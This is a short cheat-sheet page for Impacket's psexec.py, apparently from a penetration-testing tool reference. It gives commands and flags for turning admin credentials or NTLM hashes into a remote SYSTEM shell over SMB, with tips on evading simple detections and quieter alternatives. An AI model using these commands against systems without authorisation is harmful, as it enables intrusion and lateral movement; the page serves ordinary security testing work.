---
slug: psexec
name: psexec.py
category: Windows & AD
icon: terminal
tags: [smb, impacket, lateral-movement, rce, windows, system-shell]
oneLiner: Impacket's PsExec. Turns local-admin credentials into an interactive SYSTEM shell over SMB — the classic creds-to-shell move on Windows.
---

## Common usage

Get a shell with a password
```sh
psexec.py <USER>:<PASS>@<TARGET>
```

Administrator login
```sh
psexec.py administrator@<TARGET>
```

Pass-the-hash
```sh
psexec.py -hashes <LMHASH>:<NTHASH> administrator@<TARGET>
```

## Key parameters

| Flag | What it does |
| --- | --- |
| `<user>@<host>` | Target spec — user:pass@host or DOMAIN/user@host |
| `-hashes <lm:nt>` | Authenticate with an NTLM hash (pass-the-hash) |
| `-no-pass` | Skip the password prompt |
| `<command>` | Run a single command instead of an interactive shell |
| `-k` | Use Kerberos authentication |

## More flags

| Flag | What it does |
| --- | --- |
| `-target-ip <ip>` | Separate the SMB target from the name |
| `-service-name <n>` | Custom service name (evade simple detections) |
| `-codec <c>` | Output codec if text comes back garbled |
| `-dc-ip <ip>` | Domain controller IP for auth |
| `-port <n>` | SMB port (default 445) |

## Gotchas & tips

- Needs local-admin rights on the target and an accessible writable share (ADMIN$) — it drops a service to run as SYSTEM.
- You land as nt authority\\system, the highest local privilege — no further escalation needed.
- Pass-the-hash with -hashes lm:nt when you have the NT hash but not the cleartext; the LM half can be all zeros.
- If psexec.py is blocked, wmiexec.py and smbexec.py are quieter Impacket alternatives that need the same creds.
